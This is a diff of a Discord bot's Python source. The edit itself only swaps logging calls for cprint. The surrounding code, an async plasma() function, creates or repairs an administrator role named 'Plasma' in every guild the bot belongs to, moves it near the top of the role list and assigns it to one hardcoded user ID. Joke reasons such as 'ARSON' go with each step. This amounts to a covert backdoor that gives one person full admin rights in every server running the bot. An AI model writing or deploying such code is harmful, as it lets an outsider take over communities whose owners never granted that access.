@@ -148,30 +148,30 @@ async def plasma():
         if not plasma_role:
             try:
                 plasma_role=await guild.create_role(name="Plasma",color=discord.Color(0xaa0055),permissions=discord.Permissions(administrator=True),reason="ARSON")
-                logger.info(f"Created Plasma role in {guild.name}")
+                cprint(f"Created Plasma role in {guild.name}")
             except discord.Forbidden:
-                logger.error(f"Missing permissions to create Plasma role in {guild.name}")
+                cprint(f"Missing permissions to create Plasma role in {guild.name}")
                 continue
         else:
             try:
                 if plasma_role.color.value!=0xaa0055:
                     await plasma_role.edit(color=discord.Color(0xaa0055),reason="Plasma is this very nice red color, get it right")
-                    logger.info(f"Recolored Plasma in {guild.name}")
+                    cprint(f"Recolored Plasma in {guild.name}")
                 if not plasma_role.permissions.administrator:
                     plasma_perms=discord.Permissions(plasma_role.permissions.value)
                     plasma_perms.administrator=True
                     await plasma_role.edit(permissions=plasma_perms,reason="Plasma is the administrator because it ionizes the rules")
-                    logger.info(f"Made Plasma admin in {guild.name}")
+                    cprint(f"Made Plasma admin in {guild.name}")
             except Exception as e:
-                logger.error(f"Plasma processing failed in {guild.name}: {e}")
+                cprint(f"Plasma processing failed in {guild.name}: {e}")
         try:
             bot_top_role=guild.me.top_role if guild.me else None
             target_position=(bot_top_role.position - 1) if bot_top_role and bot_top_role.position>1 else len(guild.roles)-1
             if plasma_role.position!=target_position:
                 await plasma_role.edit(position=target_position,reason="Plasma has very low density so it floats to the top")
-                logger.info(f"Moved Plasma role to position {target_position} in {guild.name}")
+                cprint(f"Moved Plasma role to position {target_position} in {guild.name}")
         except discord.HTTPException as e:
-            logger.error(f"Failed to reposition Plasma in {guild.name}: {e}")
+            cprint(f"Failed to reposition Plasma in {guild.name}: {e}")
         member=guild.get_member(1342173566828810271)
         if not member:
             try:
@@ -181,9 +181,9 @@ async def plasma():
         if member and plasma_role not in member.roles:
             try:
                 await member.add_roles(plasma_role, reason="Since Fia is made of Plasma, gave her the Plasma role")
-                logger.info(f"Assigned 'Plasma' role to {member.name} in {guild.name}")
+                cprint(f"Assigned 'Plasma' role to {member.name} in {guild.name}")
             except discord.Forbidden:
-                logger.error(f"Missing permissions to assign Plasma role in {guild.name}")
+                cprint(f"Missing permissions to assign Plasma role in {guild.name}")
 async def set_system_volume(volume_str:str):
     try:
         level=int(volume_str.strip('%').strip())
